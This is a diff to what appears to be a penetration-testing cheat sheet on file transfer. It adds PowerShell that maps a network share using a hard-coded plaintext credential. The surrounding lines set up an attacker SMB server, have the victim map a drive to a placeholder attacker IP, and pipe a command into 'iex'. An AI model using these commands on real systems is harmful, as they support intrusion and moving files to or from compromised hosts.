@@ -65,6 +65,12 @@ $a.command.a.execute | iex
 attacker> sudo smbserver.py myshare ./ -smb2support
 attacker> sudo smbserver.py myshare ./ -smb2support -user rebrec -password blah
 victim> net use x: \\<ATACKER_IP>\myshare /user rebrec blah
+# 
+$username = 'rebrec'
+$password = 'rebrec'
+$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
+New-PSDrive -Name "S" -Root "\\192.168.10.10\Common" -PSProvider "FileSystem" -Credential $cred
 ```
 
 ## FTP
